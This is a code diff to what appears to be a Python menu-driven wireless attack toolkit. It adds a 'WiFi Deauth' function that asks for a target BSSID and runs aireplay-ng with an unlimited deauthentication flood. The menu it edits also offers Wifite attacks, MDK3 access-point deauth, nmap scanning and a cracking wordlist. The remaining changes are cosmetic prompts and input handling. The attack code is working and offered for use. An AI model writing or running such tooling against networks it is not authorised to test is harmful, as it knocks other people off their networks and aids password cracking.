@@ -17,6 +17,23 @@ active_wireless_networks = []
 wordlist_path = "wrdlist.txt"
 wifi_interface_choice = "wlan0"
 
+def wifideauth():
+    os.system("clear")
+    print("\033[36mWifi Deauth Attack:\033[0m")
+    print("")
+    print("\033[31mMonitored Mode must be enabled first!\033[0m")
+    print("")
+    print("Whats the bssid of the target?")
+    attack_ip = input(">")
+    if attack_ip:
+        os.system("clear")
+        try:
+            subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", attack_ip, wifi_interface_choice + "mon"])
+        except KeyboardInterrupt:
+            print("Attack Completed!")
+    elif not attack_ip:
+        print("\033[31mNo attack IP found!\033[0m")
+
 def intro():
     print("\033[35m")
     os.system('clear')
@@ -96,6 +113,9 @@ def intro():
 
 """)
     print("\033[0m")
+    time.sleep(0.5)
+    os.system('clear')
+    print("Loading...")
     time.sleep(1)
 
 def nmap_scan():
@@ -312,7 +332,8 @@ while True:
         print("3. Quick Wifite Attack (Use 3.2 for normal attack)")
         print("4. Search for Localnetwork Devices (4.1 nmap scan)")
         print("5. MDK3 AP Deauth")
-        print("6. Go back")
+        print("6. WiFi Deauth")
+        print("7. Go back")
         wifi_select = input(">")
 
         if wifi_select == "2" or wifi_select == "scan for networks":
@@ -393,8 +414,14 @@ while True:
                     print(f"Error: {e}")
             time.sleep(5)
 
-        elif wifi_select == "6" or wifi_select == "back":
+        elif wifi_select == "7" or wifi_select == "back":
             time.sleep(0.2)
+
+        elif wifi_select == "6" or wifi_select == "deauth":
+            time.sleep(0.1)
+            wifideauth()
+            print("")
+            yes_no()    
 
         elif wifi_select == "3.2" or wifi_select == "wifite":
             time.sleep(0.5)
@@ -672,6 +699,8 @@ while True:
 
 
     if mode_select == "6" or mode_select == "exit" or mode_select == "quit":
+        print("\033[31mQuitting...\033[0m")
+        time.sleep(0.4)
         subprocess.run(['sudo', 'airmon-ng', 'stop', wifi_interface_choice + 'mon'])
         os.system('clear')
         break
@@ -705,3 +734,6 @@ while True:
         os.system('clear')
         disable_monitored_mode()
         os.system('clear')
+    elif not mode_select:
+        print("\033[31mThere was no Input!\033[0m")
+        time.sleep(1)
